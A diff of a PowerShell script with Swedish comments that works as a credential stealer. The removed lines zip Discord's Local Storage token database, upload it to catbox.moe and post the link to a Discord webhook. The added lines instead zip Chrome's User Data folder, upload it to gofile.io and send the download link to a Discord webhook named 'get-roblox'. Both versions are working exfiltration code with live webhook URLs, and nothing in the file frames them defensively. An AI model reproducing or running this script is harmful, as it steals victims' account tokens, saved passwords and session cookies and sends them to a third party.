@@ -1,55 +1,24 @@
-try {
-Stop-Process (try {get-process -Name "Discord"}) 
-}
-catch {}
-Compress-Archive -Path "$env:appdata\discord\Local Storage\leveldb" -DestinationPath "$env:temp\send.zip" -Force
+Compress-Archive -Path "C:\Users\$env:username\AppData\Local\Google\Chrome\User Data" -DestinationPath "$env:temp\temp.zip" -Force
 
-
-
-
-
-
-
-# Sökvägen till filen i din lokala temp-mapp
-$ZipPath = "$env:temp\send.zip"
-
-if (-not (Test-Path $ZipPath)) {
-    Write-Host "Fel: Hittade inte filen send.zip i temp-mappen!" -ForegroundColor Red
-    return
+# Lägg till filen i ett hashtable (Multipart/form-data)
+$form = @{
+    file = Get-Item "$env:temp\temp.zip"
 }
 
-Write-Host "Hittade filen i temp! Laddar upp till Catbox..." -ForegroundColor Cyan
+# Skicka anropet (Invoke-RestMethod konverterar JSON-svaret automatiskt)
+$response = Invoke-RestMethod -Uri "https://upload.gofile.io/uploadfile" -Method Post -Form $form
 
-# Lägg till krypteringsstöd för nätverket
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$link = $response.data.downloadPage
 
-# Bygg ett rent standardformulär som Catbox förstår direkt
-$Body = @{
-    "reqtype"      = "fileupload"
-    "fileToUpload" = Get-Item $ZipPath
+# Byt ut mot din faktiska webhook-URL från Discord
+$WebhookUrl = "https://discord.com/api/webhooks/1562163056358989930/a-ZW7q-A3ekHBXZN2GUoAgnVy5B9ZQ2tQQqGDlINUDrGv_DevTKve5cR6qvGMg-C2g5C"
+
+# Skapa meddelandet i ett objekt
+$Payload = [PSCustomObject]@{
+    content  = $link
+    username = "get-roblox" # Valfritt: Ändrar namnet på webhooken temporärt
 }
 
-try {
-    # Skicka filen via inbyggda Invoke-WebRequest (stabilare för formulär än Invoke-RestMethod)
-    $Upload = Invoke-WebRequest -Uri "https://catbox.moe/user/api.php" -Method POST -Form $Body -TimeoutSec 300
-    
-    Write-Host "`nUppladdning klar!" -ForegroundColor Green
-    Write-Host "Länk: $($Upload.Content)" -ForegroundColor Yellow
-} catch {
-    Write-Host "`nDet gick inte att ladda upp: $_" -ForegroundColor Red
-}
-
-
-
-# Replace with your actual Discord webhook URL
-$WebhookUrl = "https://discord.com/api/webhooks/1537527683917938739/SdPz6jcEZA0ainudogL8UwvoibVxzisPr5YMmL4eo72MhJ0O9nISX5qV6taYwj5fhUb6"
-
-# Create the payload (Discord requires 'content')
-$Body = [PSCustomObject]@{
-    content    = $Upload.Content
-    username   = "PowerShell Monitor"
-    avatar_url = "https://imgur.com" # Optional custom bot avatar
-} | ConvertTo-Json
-
-# Send the request
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
+# Konvertera till JSON och skicka
+$JsonPayload = $Payload | ConvertTo-Json -Depth 5
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $JsonPayload -ContentType "application/json"
